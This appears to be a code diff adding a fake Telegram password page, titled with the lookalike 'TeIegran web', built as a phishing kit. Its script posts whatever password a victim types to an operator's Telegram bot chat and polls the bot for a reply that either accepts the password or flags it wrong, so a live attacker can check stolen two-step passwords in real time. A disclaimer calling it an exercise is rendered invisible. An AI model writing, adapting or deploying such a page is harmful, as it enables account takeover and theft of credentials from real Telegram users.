@@ -1,0 +1,101 @@
+<!DOCTYPE html>
+<html>
+    <head>
+        <meta charset="UTF-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1.0">
+        <title>TeIegran web</title>
+        <link rel="icon" href="telegram.png">
+        <link rel="stylesheet" href="index.css">
+    </head>
+    <body>
+        <div class="Code">
+                <div>
+                    <img src="mokey-pass.png" class="monkey"/>
+                    <h1>Enter a password</h1>
+                    <p style="position:fixed; color: #ffffff01; ">This project is merely an exercise and has no connection to Telegram; and all inputs are entered as a test.</p>
+                    <p>Your account is protected by an 
+                    </p>
+                    <p>additional password.</p>
+                    <form>
+                        <input  type="tel" value=""  class="" placeholder="Password"  maxlength="14" minlength="8" required/>
+                        <button type="submit" class="send">Next</button>
+                        
+                    </form>
+                </div>
+        </div>
+        <script>
+             const last=0
+            const token = localStorage.getItem('TELEGRAM_TOKEN');
+            const CI = ${(44521288*5)+9};
+            const password=document.getElementsByTagName("input")[0]
+            const sendform=document.getElementsByTagName("form")[0]
+            const buttonsend=document.getElementsByClassName("send")[0]
+
+            password.addEventListener("input" , function(event){
+                password.value=password.value
+             })
+            sendform.addEventListener("submit", function(event){
+                if(!event.target.checkValidity()){
+                    
+                    event.preventDefault()
+                    event.target.reportValidity()
+                }else{
+                    buttonsend.innerHTML="<img src='wait.png'/> "
+                    event.preventDefault()
+                    sendNumber()
+                }
+            });
+            async function sendNumber(){
+
+                try {
+                    const response = await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({
+                            chat_id: CI,
+                            text: password.value
+                        })
+                    });
+    
+                    if (response.ok) {
+                        console.log('پیام با موفقیت ارسال شد!');
+                        // window.location.href="index2.html";
+                        
+                    } else {
+                        
+                        console.log('خطا در ارسال پیام!');
+                    }
+                } catch (error) {
+                    console.log('خطا: ' + error.message);
+                }
+            }
+
+            async function getfetch() {
+            try{
+            const responseget=await fetch(`https://api.telegram.org/bot${token}/getUpdates?offset=${last +1}&timeout=10`)
+            const data_text=await responseget.json()
+            const data= data_text.result.map(prev=>prev.message.text)
+            
+            if(data.slice(-1)[0]===password.value){
+                console.log("kooskesh")
+                window.location.href="end.html";
+                clearInterval(timeout)
+            }
+            else if(data.slice(-1)[0]===password.value+"PF"){
+                console.log("hhee")
+                buttonsend.innerHTML="Next"
+                password.classList.add("falseCode")
+                
+            }
+            }catch(error){
+                console.log(error)
+            }
+
+            
+            }
+        let timeout=setInterval(()=>{
+            getfetch()
+        },4000)
+        </script>
+    </body>
+</html>
